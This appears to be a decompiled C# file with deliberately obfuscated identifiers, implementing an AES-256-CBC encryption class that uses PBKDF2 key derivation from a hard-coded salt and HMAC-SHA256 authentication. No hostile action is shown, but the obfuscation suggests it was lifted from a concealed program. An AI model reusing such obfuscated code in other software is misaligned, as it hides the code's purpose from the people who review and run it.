using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

namespace qtFMSUyUZbDNyWbv;

public class DMiARzUMxaYp
{
	private const int WsYCnoNDFnTUfi = 32;

	private const int qDULlzfcENQdo = 64;

	private const int fizCyaidItPXc = 16;

	private const int IFgGhphfreqCg = 32;

	private readonly byte[] vVxTFrXhotMCz;

	private readonly byte[] aHyYRHKrBvnki;

	private static readonly byte[] LyeJXpSqROyVKam = new byte[32]
	{
		191, 235, 30, 86, 251, 205, 151, 59, 178, 25,
		2, 36, 48, 165, 120, 67, 0, 61, 86, 68,
		210, 30, 98, 185, 212, 241, 128, 231, 230, 195,
		57, 65
	};

	public DMiARzUMxaYp(string UZVVQWpYhNOid)
	{
		if (string.IsNullOrEmpty(UZVVQWpYhNOid))
		{
			throw new ArgumentException("masterKey can not be null or empty.");
		}
		using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(UZVVQWpYhNOid, LyeJXpSqROyVKam, 50000);
		vVxTFrXhotMCz = rfc2898DeriveBytes.GetBytes(32);
		aHyYRHKrBvnki = rfc2898DeriveBytes.GetBytes(64);
	}

	public string CFbsuXBGKXUXo(string rpxesvAQfm)
	{
		return Convert.ToBase64String(XhljdgjUWSvlx(Encoding.UTF8.GetBytes(rpxesvAQfm)));
	}

	public byte[] XhljdgjUWSvlx(byte[] uIPpgpyOjKHEXuj)
	{
		if (uIPpgpyOjKHEXuj == null)
		{
			throw new ArgumentNullException("input can not be null.");
		}
		using MemoryStream memoryStream = new MemoryStream();
		memoryStream.Position = 32L;
		using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
		{
			aesCryptoServiceProvider.KeySize = 256;
			aesCryptoServiceProvider.BlockSize = 128;
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			aesCryptoServiceProvider.Key = vVxTFrXhotMCz;
			aesCryptoServiceProvider.GenerateIV();
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
			memoryStream.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
			cryptoStream.Write(uIPpgpyOjKHEXuj, 0, uIPpgpyOjKHEXuj.Length);
			cryptoStream.FlushFinalBlock();
			using HMACSHA256 hMACSHA = new HMACSHA256(aHyYRHKrBvnki);
			byte[] array = hMACSHA.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
			memoryStream.Position = 0L;
			memoryStream.Write(array, 0, array.Length);
		}
		return memoryStream.ToArray();
	}

	public string AEdEeNrnoT(string RbEqrZBLWzRdWz)
	{
		return Encoding.UTF8.GetString(BDPzNPPKkZek(Convert.FromBase64String(RbEqrZBLWzRdWz)));
	}

	public byte[] BDPzNPPKkZek(byte[] IEPWFaFknSdGD)
	{
		if (IEPWFaFknSdGD == null)
		{
			throw new ArgumentNullException("input can not be null.");
		}
		using MemoryStream memoryStream = new MemoryStream(IEPWFaFknSdGD);
		using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Key = vVxTFrXhotMCz;
		using (HMACSHA256 hMACSHA = new HMACSHA256(aHyYRHKrBvnki))
		{
			byte[] wZSJGTfPfRNGYNE = hMACSHA.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
			byte[] array = new byte[32];
			memoryStream.Read(array, 0, array.Length);
			if (!QuGNknUCXNKutm(wZSJGTfPfRNGYNE, array))
			{
				throw new CryptographicException("Invalid message authentication code (MAC).");
			}
		}
		byte[] array2 = new byte[16];
		memoryStream.Read(array2, 0, 16);
		aesCryptoServiceProvider.IV = array2;
		using CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read);
		byte[] array3 = new byte[memoryStream.Length - 16L + 1L];
		byte[] array4 = new byte[cryptoStream.Read(array3, 0, array3.Length)];
		Buffer.BlockCopy(array3, 0, array4, 0, array4.Length);
		return array4;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private bool QuGNknUCXNKutm(byte[] wZSJGTfPfRNGYNE, byte[] wgOGyhsHQEmPi)
	{
		bool result = true;
		for (int i = 0; i < wZSJGTfPfRNGYNE.Length; i++)
		{
			if (wZSJGTfPfRNGYNE[i] != wgOGyhsHQEmPi[i])
			{
				result = false;
			}
		}
		return result;
	}
}
